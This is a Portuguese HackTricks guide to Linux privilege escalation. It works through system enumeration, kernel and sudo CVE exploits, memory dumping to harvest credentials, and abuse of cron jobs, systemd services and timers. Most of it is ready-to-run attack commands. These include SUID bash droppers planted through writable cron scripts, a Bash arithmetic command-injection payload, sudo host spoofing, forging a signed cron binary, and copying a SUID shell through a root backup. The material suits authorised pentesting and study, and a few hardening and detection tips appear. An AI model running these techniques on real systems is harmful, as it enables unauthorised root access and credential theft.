# Escalonamento de Privilégios no Linux

{{#include ../../../banners/hacktricks-training.md}}

## Informações do Sistema

### Informações do SO

Vamos começar obtendo algum conhecimento sobre o SO em execução
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Se você **tiver permissões de escrita em qualquer pasta dentro da variável `PATH`**, poderá sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do ambiente

Há informações interessantes, passwords ou API keys nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploits do kernel

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalar privilégios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits já compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Outros sites onde você pode encontrar alguns **exploits já compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões vulneráveis do kernel desse site, você pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar por kernel exploits são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute NA vítima; verifica apenas exploits para o kernel 2.x)

Sempre **procure a versão do kernel no Google**; talvez sua versão do kernel esteja mencionada em algum kernel exploit e, então, você terá certeza de que esse exploit é válido.

Técnicas adicionais de exploração do kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalação de privilégios no Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo está vulnerável usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Versões do Sudo anteriores à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permitem que usuários locais sem privilégios elevem seus privilégios para root por meio da opção `--chroot` do sudo quando o arquivo `/etc/nsswitch.conf` é usado a partir de um diretório controlado pelo usuário.

Aqui está um [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que sua versão do `sudo` é vulnerável e oferece suporte ao recurso `chroot`.

Para mais informações, consulte o [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original.

### Sudo host-based rules bypass (CVE-2025-32462)

O Sudo anterior à versão 1.9.17p1 (faixa afetada informada: **1.8.8–1.9.17**) pode avaliar regras sudoers baseadas em host usando o **hostname fornecido pelo usuário** por meio de `sudo -h <host>`, em vez do **hostname real**. Se o sudoers conceder privilégios mais amplos em outro host, você poderá fazer **spoof** desse host localmente.

Requisitos:
- Versão vulnerável do sudo
- Regras sudoers específicas para host (o host não é o hostname atual nem `ALL`)

Exemplo de padrão do sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit por spoofing do host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Se a resolução do nome falsificado bloquear, adicione-o a `/etc/hosts` ou use um hostname que já apareça em logs/configs para evitar consultas DNS.

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Falha na verificação da assinatura do dmesg

Consulte a **máquina smasher2 do HTB** para ver um **exemplo** de como esta vulnerabilidade poderia ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

If you are inside a container, start with the following container-security section and then pivot into the runtime-specific abuse pages:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Check **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar se há informações privadas
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Além disso, verifique se **algum compilador está instalado**. Isso é útil caso você precise usar algum exploit de kernel, pois é recomendado compilá-lo na máquina onde você pretende usá-lo (ou em uma semelhante).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios, por exemplo, que possa ser explorada para a escalada de privilégios…\
Recomenda-se verificar manualmente a versão dos softwares instalados mais suspeitos.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tiver acesso SSH à máquina, também poderá usar o **openVAS** para verificar se há software desatualizado e vulnerável instalado na máquina.

> [!NOTE] > _Observe que esses comandos mostrarão muitas informações que, em sua maioria, serão inúteis; portanto, é recomendado usar aplicações como o OpenVAS ou similares, que verificarão se alguma versão de software instalada é vulnerável a exploits conhecidos_

## Processos

Observe **quais processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado pelo root?).
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique se há possíveis [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) em execução; você pode abusar deles para escalar privilégios. O **Linpeas** os detecta verificando o parâmetro `--inspect` na linha de comando do processo.\
Verifique também seus **privilégios sobre os binários dos processos**; talvez você possa sobrescrever algum deles.

### Cadeias pai-filho entre usuários

Um processo filho executado por um **usuário diferente** daquele de seu processo pai não é automaticamente malicioso, mas é um **sinal útil para triagem**. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, auxiliares de debug, persistência ou limites fracos de confiança em runtime.

Revisão rápida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Se você encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em vários caminhos reais de privesc, o processo filho não era gravável, mas a **config controlada pelo processo pai** ou a cadeia de scripts auxiliares era.

### Executáveis excluídos e arquivos abertos excluídos

Artefatos de execução geralmente ainda podem ser acessados **após a exclusão**. Isso é útil tanto para escalada de privilégios quanto para recuperar evidências de um processo que já tenha arquivos confidenciais abertos.

Verifique se há executáveis excluídos:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Se `/proc/<PID>/exe` apontar para `(deleted)`, o processo ainda estará executando a imagem antiga do binário a partir da memória. Esse é um forte sinal para investigação porque:

- o executável removido pode conter strings ou credenciais interessantes
- o processo em execução ainda pode expor descritores de arquivo úteis
- um binário privilegiado excluído pode indicar adulteração recente ou uma tentativa de limpeza

Colete globalmente os arquivos abertos excluídos:
```bash
lsof +L1
```
Se encontrar um descritor interessante, recupere-o diretamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Isso é especialmente valioso quando um processo ainda mantém aberto um secret, script, database export ou arquivo de flag excluído.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis que são executados com frequência ou quando um conjunto de requisitos é atendido.

### Memória de processos

Alguns serviços de um servidor armazenam **credenciais em texto claro dentro da memória**.\
Normalmente, você precisará de **privilégios de root** para ler a memória de processos pertencentes a outros usuários; portanto, isso geralmente é mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se de que **como um usuário comum, você pode ler a memória dos processos que possui**.

> [!WARNING]
> Observe que atualmente a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode fazer dump de outros processos pertencentes ao seu usuário sem privilégios.
>
> O arquivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla a acessibilidade do ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esta é a forma clássica como o ptracing funcionava.
> - **kernel.yama.ptrace_scope = 1**: apenas um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: somente um administrador pode usar ptrace, pois isso requer a capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Depois de definido, é necessário reiniciar o sistema para habilitar o ptracing novamente.

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo), poderá obter o Heap e pesquisar dentro dele por credenciais.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, **maps mostra como a memória é mapeada dentro do espaço de endereçamento** virtual desse processo; ele também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória do processo**. A partir do arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus offsets. Usamos essas informações para **buscar no arquivo mem e despejar todas as regiões legíveis** em um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereços virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido por **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump é uma releitura para Linux da ferramenta clássica ProcDump do conjunto de ferramentas Sysinternals para Windows. Obtenha-a em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para despejar a memória de um processo, você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e despejar o processo pertencente a você
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da Memória do Processo

#### Exemplo manual

Se você descobrir que o processo autenticador está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode fazer o dump do processo (consulte as seções anteriores para encontrar diferentes maneiras de fazer o dump da memória de um processo) e procurar credenciais na memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **roubará credenciais em texto claro da memória** e de alguns **arquivos conhecidos**. Ela requer privilégios de root para funcionar corretamente.

| Recurso                                           | Nome do processo         |
| ------------------------------------------------- | ------------------------ |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password             |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon     |
| LightDM (Ubuntu Desktop)                          | lightdm                  |
| VSFTPd (conexões FTP ativas)                      | vsftpd                   |
| Apache2 (sessões ativas de autenticação HTTP Basic) | apache2                |
| OpenSSH (sessões SSH ativas - uso de Sudo)        | sshd:                    |

#### Expressões Regex de busca/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

If um painel web “Crontab UI” (alseambusher/crontab-ui) for executado como root e estiver vinculado apenas ao loopback, você ainda poderá acessá-lo por meio de SSH local port-forwarding e criar um job privilegiado para escalar privilégios.

Cadeia típica
- Descobrir a porta disponível apenas no loopback (por exemplo, 127.0.0.1:8000) e o realm de Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciais em artefatos operacionais:
- Backups/scripts com `zip -P <password>`
- Unidade do systemd expondo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Criar o túnel e fazer login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crie um job com altos privilégios e execute-o imediatamente (cria um shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Não execute o Crontab UI como root; restrinja-o a um usuário dedicado com permissões mínimas
- Vincule-o ao localhost e, adicionalmente, restrinja o acesso por meio de firewall/VPN; não reutilize senhas
- Evite incorporar secrets em unit files; use secret stores ou um EnvironmentFile acessível apenas pelo root
- Ative auditoria/logging para execuções de jobs sob demanda



Verifique se algum job agendado está vulnerável. Talvez você possa aproveitar um script executado pelo root (wildcard vuln? pode modificar arquivos usados pelo root? usar symlinks? criar arquivos específicos no diretório usado pelo root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Se `run-parts` for usado, verifique quais nomes realmente serão executados:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Isso evita falsos positivos. Um diretório periódico com permissão de escrita só é útil se o nome do arquivo do seu payload corresponder às regras locais do `run-parts`.

### Caminho do cron

Por exemplo, dentro de _/etc/crontab_, você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe que o usuário "user" tem permissões de escrita sobre /home/user_)

Se, dentro desse crontab, o usuário root tentar executar algum comando ou script sem definir o path. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um wildcard (Wildcard Injection)

Se um script for executado pelo root e tiver um “**\***” dentro de um comando, você poderá explorar isso para fazer coisas inesperadas (como privesc). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o wildcard for precedido por um caminho como** _**/some/path/\***_ **, ele não é vulnerável (nem mesmo** _**./\***_ **).**

Leia a página a seguir para conhecer mais técnicas de exploração de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injeção de expansão aritmética do Bash em parsers de logs do cron

O Bash realiza expansão de parâmetros e substituição de comandos antes da avaliação aritmética em `((...))`, `$((...))` e `let`. Se um cron/parser executado como root ler campos de log não confiáveis e os inserir em um contexto aritmético, um atacante poderá injetar uma substituição de comando `$(...)`, que será executada como root quando o cron for executado.

- Por que funciona: no Bash, as expansões ocorrem nesta ordem: expansão de parâmetros/variáveis, substituição de comandos, expansão aritmética e, em seguida, divisão de palavras e expansão de nomes de caminho. Portanto, um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é substituído primeiro (executando o comando), e o `0` numérico restante é usado na aritmética, permitindo que o script continue sem erros.

- Padrão vulnerável típico:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploração: faça com que um texto controlado pelo atacante seja gravado no log analisado, de modo que o campo com aparência numérica contenha uma substituição de comando e termine com um dígito. Garanta que o comando não imprima nada em stdout (ou redirecione essa saída) para que a aritmética permaneça válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Sobrescrita de script do cron e symlink

Se você **puder modificar um script do cron** executado como root, poderá obter um shell com muita facilidade:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado pelo root usa um **diretório ao qual você tem acesso total**, talvez seja útil excluir essa pasta e **criar uma pasta de link simbólico para outra** que contenha um script controlado por você.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validação de symlink e manipulação mais segura de arquivos

Ao revisar scripts/binários privilegiados que leem ou gravam arquivos por caminho, verifique como os links são tratados:

- `stat()` segue um symlink e retorna os metadados do alvo.
- `lstat()` retorna os metadados do próprio link.
- `readlink -f` e `namei -l` ajudam a resolver o alvo final e mostrar as permissões de cada componente do caminho.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defenders/developers, padrões mais seguros contra truques com symlink incluem:

- `O_EXCL` com `O_CREAT`: falha se o path já existir (bloqueia links/files pré-criados pelo attacker).
- `openat()`: opera relativamente a um file descriptor de um diretório confiável.
- `mkstemp()`: cria arquivos temporários atomicamente com permissões seguras.

### Binários cron personalizados assinados com payloads graváveis

Blue teams às vezes "assinam" binários acionados pelo cron, despejando uma seção ELF personalizada e usando grep para procurar uma string do vendor antes de executá-los como root. Se esse binário tiver permissão de escrita para o grupo (por exemplo, `/opt/AV/periodic-checks/monitor` pertencente a `root:devs 770`) e você conseguir fazer leak do material de assinatura, poderá forjar a seção e sequestrar a tarefa do cron:

1. Use `pspy` para capturar o fluxo de verificação. No Era, o root executou `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, seguido por `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, e então executou o arquivo.
2. Recrie o certificado esperado usando a key/config vazada (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Compile uma substituição maliciosa (por exemplo, faça drop de um SUID bash ou adicione sua SSH key) e incorpore o certificado em `.text_sig` para que o grep passe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescreva o binário agendado preservando as permissões de execução:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Aguarde a próxima execução do cron; assim que a verificação ingênua da assinatura for bem-sucedida, seu payload será executado como root.

### Tarefas cron frequentes

Você pode monitorar os processos para procurar processos que estejam sendo executados a cada 1, 2 ou 5 minutos. Talvez seja possível tirar proveito disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e remover os comandos que tiverem sido executados com mais frequência, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso monitorará e listará todos os processos iniciados).

### Backups executados pelo root que preservam mode bits definidos pelo atacante (pg_basebackup)

Se um cron pertencente ao root executar `pg_basebackup` (ou qualquer cópia recursiva) em um diretório de banco de dados no qual você pode escrever, você pode inserir um **binário SUID/SGID** que será recopiado como **root:root**, com os mesmos mode bits, para o destino do backup.

Fluxo típico de descoberta (como um usuário de banco de dados com poucos privilégios):
- Use `pspy` para identificar um cron do root executando algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` a cada minuto.
- Confirme que o cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) permite escrita por você e que o destino (`/opt/backups/current`) passa a pertencer ao root após a execução do job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Isso funciona porque `pg_basebackup` preserva os bits de modo dos arquivos ao copiar o cluster; quando invocado pelo root, os arquivos de destino herdam **propriedade do root + SUID/SGID escolhidos pelo atacante**. Qualquer rotina semelhante de backup/cópia privilegiada que mantenha as permissões e grave em um local executável é vulnerável.

### Cronjobs invisíveis

É possível criar um cronjob **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e o cronjob funcionará. Exemplo (observe o caractere de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar esse tipo de entrada furtiva, inspecione os arquivos do cron com ferramentas que exibam caracteres de controle:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`; se puder, você **poderá modificá-lo** para que ele **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário aguardar até que a máquina seja reiniciada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviços graváveis

Tenha em mente que, se você tiver **permissões de escrita sobre binários executados por serviços**, poderá alterá-los para backdoors; assim, quando os serviços forem executados novamente, os backdoors serão executados.

### systemd PATH - Caminhos Relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, talvez consiga **escalar privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços**, como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Então, crie um **executável** com o **mesmo nome do binário do caminho relativo** dentro da pasta do PATH do systemd na qual você pode escrever e, quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), seu **backdoor será executado** (usuários sem privilégios geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Timers**

**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado para eventos de tempo de calendário e eventos de tempo monotônico, além de poderem ser executados de forma assíncrona.

Você pode enumerar todos os timers com:
```bash
systemctl list-timers --all
```
### Timers graváveis

Se você puder modificar um timer, poderá fazê-lo executar algum dos componentes existentes de systemd.unit (como um `.service` ou um `.target`).
```bash
Unit=backdoor.service
```
Na documentação, você pode ler o que é a Unit:

> A unidade a ser ativada quando este timer expirar. O argumento é um nome de unidade cujo sufixo não é ".timer". Se não especificado, esse valor assume como padrão um service que tenha o mesmo nome que a unidade do timer, exceto pelo sufixo. (Veja acima.) É recomendado que o nome da unidade ativada e o nome da unidade do timer sejam idênticos, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

- Encontrar alguma unidade do systemd (como um `.service`) que esteja **executando um binário gravável**
- Encontrar alguma unidade do systemd que esteja **executando um caminho relativo** e sobre a qual você tenha **privilégios de escrita** no **PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre timers com `man systemd.timer`.**

### **Habilitando o Timer**

Para habilitar um timer, você precisa de privilégios de root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Observe que o **timer** é **ativado** criando um symlink para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permitem a **comunicação entre processos** na mesma máquina ou em máquinas diferentes dentro de modelos cliente-servidor. Eles utilizam arquivos descritores Unix padrão para comunicação entre computadores e são configurados por meio de arquivos `.socket`.

Os sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro desse arquivo, vários parâmetros interessantes podem ser configurados:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** o socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou número da porta a escutar etc.)
- `Accept`: Aceita um argumento booleano. Se for **true**, uma **instância de serviço é iniciada para cada conexão recebida** e somente o socket da conexão é passado para ela. Se for **false**, todos os sockets de escuta são **passados para a unit de serviço iniciada**, e apenas uma unit de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, nos quais uma única unit de serviço trata incondicionalmente todo o tráfego recebido. **O padrão é false**. Por motivos de desempenho, recomenda-se escrever novos daemons apenas de uma forma compatível com `Accept=no`.
